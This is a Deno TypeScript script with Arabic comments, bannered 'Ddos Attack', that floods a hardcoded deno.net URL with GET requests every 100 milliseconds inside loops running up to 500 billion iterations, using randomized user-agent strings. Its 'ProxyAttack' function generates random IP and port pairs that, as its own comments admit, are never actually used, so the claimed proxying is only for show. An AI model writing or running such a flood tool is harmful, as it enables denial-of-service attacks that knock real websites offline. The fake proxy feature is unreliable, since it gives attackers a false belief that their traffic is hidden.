// deno run --allow-net script.ts

// === دالة لتوليد user-agent مثل generate_user_agent ===
function generate_user_agent(): string {
  const browsers = ["Chrome", "Firefox", "Safari", "Edge"];
  const systems = ["Windows NT 10.0", "Macintosh", "X11; Linux x86_64"];
  const browser = browsers[Math.floor(Math.random() * browsers.length)];
  const system = systems[Math.floor(Math.random() * systems.length)];
  return `Mozilla/5.0 (${system}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}/88.0.4324.150 Safari/537.36`;
}

// === بديل pyfiglet ===
import { figlet } from "https://deno.land/x/figlet@0.0.2/mod.ts";

// === ألوان ===
const F = '\x1b[1;32m';
const Z = '\x1b[1;31m';
const S = '\x1b[1;33m';
const B = '\x1b[38;5;208m';

console.log(`${F}[✓] جميع المكتبات مثبتة وجاهزة للاستخدام!${Z}`);

const renderedFig = figlet.textSync("Ddos Attack", { font: "Slant" });
console.log(renderedFig);

// === نفس دالة linked() ===
function linked() {
  const sg = '2';
  if (sg === '1') {
    for (let i = 0; i < 50000; i++) {
      AttackMahos();
    }
  } else if (sg === '2') {
    for (let i = 0; i < 500000000000; i++) {
      ProxyAttack();
    }
  }
}

// === دالة AttackMahos الأصلية كما هي ===
function AttackMahos() {
  setInterval(async () => {
    const headers = new Headers({
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': generate_user_agent()
    });

    try {
      const response = await fetch(url, { method: 'GET', headers });
      if (response.status === 200) {
        console.log(`${F}GOOD Attack: ${url}`);
      } else {
        console.log(`${Z}BAD Attack: ${url}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url}`);
    }
  }, 100);
}

// === دالة ProxyAttack الأصلية كما هي ===
function ProxyAttack() {
  setInterval(async () => {
    const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
    const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
    const port = pl[Math.floor(Math.random() * pl.length)];
    const proxy = `${ip}:${port}`;

    const headers = new Headers({
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': generate_user_agent()
    });

    try {
      // ملاحظة: Deno لا يدعم بروكسي مباشرة
      // ستعمل بشكل رمزي فقط، بدون فعالية بروكسي حقيقية
      const response = await fetch(url, { method: 'GET', headers });
      if (response.status === 200) {
        console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
      } else {
        console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url} |`);
    }
  }, 100);
}

// === الرابط مثل الأصلي تمامًا ===
const url = 'https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/';

// === بدء التنفيذ ===
linked();
